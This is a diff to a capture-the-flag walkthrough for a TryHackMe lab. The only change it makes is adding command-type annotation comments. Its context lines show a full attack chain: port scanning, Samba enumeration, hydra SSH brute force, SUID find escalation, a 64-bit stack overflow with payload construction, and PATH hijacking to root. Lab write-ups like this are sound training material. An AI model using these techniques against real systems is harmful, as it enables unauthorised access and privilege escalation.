@@ -10,6 +10,7 @@ Read the file `flag.txt` from **kel**'s home directory by exploiting a 64-bit st
 
 Full port scan and service enumeration:
 
+<!-- cmd: linux -->
 ```bash
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
 nmap -sVC -p22,139,445 $TARGET -oN service
@@ -19,6 +20,7 @@ nmap -sVC -p22,139,445 $TARGET -oN service
 
 ### Samba Enumeration
 
+<!-- cmd: linux -->
 ```bash
 smbmap -u '' -p '' -H $TARGET
 enum4linux -r $TARGET
@@ -28,6 +30,7 @@ Users discovered: `kel`, `des`, `tryhackme`, `noentry`
 
 ### SSH Brute Force
 
+<!-- cmd: linux -->
 ```bash
 hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
 ```
@@ -40,6 +43,7 @@ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
 
 ### Find SUID binaries
 
+<!-- cmd: linux -->
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 # /usr/bin/find
@@ -47,6 +51,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 ### Exploit `find` SUID (GTFOBins)
 
+<!-- cmd: linux -->
 ```bash
 find . -exec /bin/sh -p \; -quit
 cat /home/flag.txt
@@ -56,6 +61,7 @@ cat /home/flag.txt
 
 SSH in as `des`:
 
+<!-- cmd: linux -->
 ```bash
 ssh des@$TARGET
 ```
@@ -90,6 +96,7 @@ The vulnerability is clear: `buffer` is only 600 bytes, but `read()` accepts up 
 
 ### Verify ASLR is disabled
 
+<!-- cmd: linux -->
 ```bash
 sysctl kernel.randomize_va_space
 # kernel.randomize_va_space = 0
@@ -103,12 +110,14 @@ ASLR is off, meaning stack addresses are **fixed and predictable** across runs.
 
 ### Step 1 — Generate a cyclic pattern
 
+<!-- cmd: linux -->
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
 ```
 
 Paste the pattern as input to the binary inside GDB:
 
+<!-- cmd: linux -->
 ```bash
 gdb ./bof
 run
@@ -123,6 +132,7 @@ rbp = 0x4134754133754132
 
 ### Step 3 — Calculate the offset
 
+<!-- cmd: linux -->
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q 0x4134754133754132
 # [*] Exact match at offset 608
@@ -142,12 +152,14 @@ In 64-bit x86, the stack layout inside `foo()` is:
 
 Send a structured payload to confirm control:
 
+<!-- cmd: linux -->
 ```bash
 run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
 ```
 
 Inspect the stack:
 
+<!-- cmd: linux -->
 ```bash
 x/4xg $rsp
 # 0x7fffffffe498: 0x4343434343434343   <-- our C's are on the stack (RIP)
@@ -162,6 +174,7 @@ x/4xg $rsp
 
 Set a breakpoint at the `ret` instruction of `foo` and inspect the stack:
 
+<!-- cmd: linux -->
 ```bash
 break *0x000055555555484e   # address of retq in foo
 run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*608 + b'B'*8 + b'C'*8)")
@@ -189,6 +202,7 @@ The buffer starts at `0x7fffffffe230`. We aim the return address at the **middle
 
 ### Annotated exploit script
 
+<!-- cmd: python -->
 ```python
 import struct
 
@@ -275,6 +289,7 @@ print(f"Total:     {len(payload)} bytes")
 
 ### Run the exploit
 
+<!-- cmd: linux -->
 ```bash
 python3 buffer.py
 (cat payload.bin; cat) | ./bof
@@ -300,6 +315,7 @@ The `cat` at the end keeps stdin open so you can type commands in the spawned sh
 
 ### Read kel flag
 
+<!-- cmd: linux -->
 ```bash
 Enter some string:
 $ whoami
@@ -314,6 +330,7 @@ password: kelvin_74656d7065726174757265
 
 ## Priviesc to root
 
+<!-- cmd: linux -->
 ```bash
 ls 
 cat exe.c
@@ -329,6 +346,7 @@ cat exe.c
 ### Te binary is vulnerable to path hijacking
 
 ### Execution
+<!-- cmd: linux -->
 ```bash
 echo '/bin/bash' > ps
 chmod +x ps
